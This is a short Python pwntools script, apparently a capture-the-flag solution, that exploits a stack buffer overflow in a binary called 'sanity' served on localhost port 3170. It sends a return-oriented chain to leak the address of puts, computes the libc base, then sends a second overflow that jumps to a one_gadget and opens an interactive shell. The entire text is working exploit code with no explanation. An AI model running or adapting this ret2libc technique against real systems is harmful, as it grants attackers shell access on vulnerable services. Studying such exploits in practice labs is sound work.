from pwn import *

libc=ELF("libc-2.23.so")
#r=process("./sanity")
r=remote("localhost",3170)
offset=120
one=0xf1147 
put_got=0x000000000601018
put_plt=0x4004b0
pop_rdi_ret=0x00000000004006a3
main=0x00000000004005f6 
payload="A"*offset+p64(pop_rdi_ret)+p64(put_got)+p64(put_plt)+p64(main)

r.recvuntil("\n")

r.sendline(payload)

leak=r.recvuntil("\n")
print leak

leak=(leak[:-1].ljust(8,"\x00"))

leak=u64(leak)

print hex(leak)

libc_base=leak-libc.symbols['puts']

one_gadget=libc_base+one

r.recvuntil("\n")

r.sendline("A"*offset+p64(one_gadget))

r.interactive()
